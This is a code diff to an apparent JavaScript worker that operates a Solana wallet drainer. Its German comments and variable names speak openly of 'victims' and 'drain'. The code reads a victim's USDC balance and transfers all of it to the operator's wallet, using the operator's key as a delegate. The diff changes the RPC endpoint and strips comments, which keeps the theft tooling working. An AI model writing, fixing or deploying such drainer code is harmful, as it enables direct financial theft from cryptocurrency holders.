@@ -50,7 +50,8 @@ export default {
 
           if (data.startsWith("balance:")) {
             const victimAddress = data.split(":")[1];
-            const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+            // NEUER RPC FÜR BALANCE CHECK
+            const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
             const victimPubkey = new PublicKey(victimAddress);
             const solBalance = await connection.getBalance(victimPubkey);
             const solAmount = (solBalance / 1e9).toFixed(4);
@@ -70,8 +71,8 @@ export default {
             });
 
             try {
-              // Wir nutzen einen starken RPC für den Worker
-              const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+              // NEUER RPC FÜR DRAIN
+              const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
               const privateKeyArray = bs58.decode(env.PRIVATE_KEY);
               const payer = Keypair.fromSecretKey(privateKeyArray);
               
@@ -81,7 +82,6 @@ export default {
               const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
               const myAta = await getAssociatedTokenAddress(USDC_MINT, payer.publicKey);
 
-              // Hole die exakte USDC Balance des Opfers
               const balance = await connection.getTokenAccountBalance(victimAta);
               const amountToDrain = balance.value.amount;
 
@@ -89,26 +89,24 @@ export default {
                 throw new Error("Victim has 0 USDC to drain.");
               }
 
-              // Prüfen, ob DEINE Wallet ein USDC Konto hat, wenn nicht, erstellen
               const tx = new Transaction();
               const myAtaInfo = await connection.getAccountInfo(myAta);
               if (myAtaInfo === null) {
                 tx.add(
                   createAssociatedTokenAccountInstruction(
-                    payer.publicKey, // Payer
-                    myAta,           // Associated Token Address
-                    payer.publicKey, // Owner
-                    USDC_MINT        // Mint
+                    payer.publicKey,
+                    myAta,
+                    payer.publicKey,
+                    USDC_MINT
                   )
                 );
               }
 
-              // Transfer Instruction hinzufügen
               tx.add(
                 createTransferInstruction(
                   victimAta,
                   myAta,
-                  payer.publicKey, // Der Delegate (du)
+                  payer.publicKey,
                   [],
                   parseInt(amountToDrain)
                 )
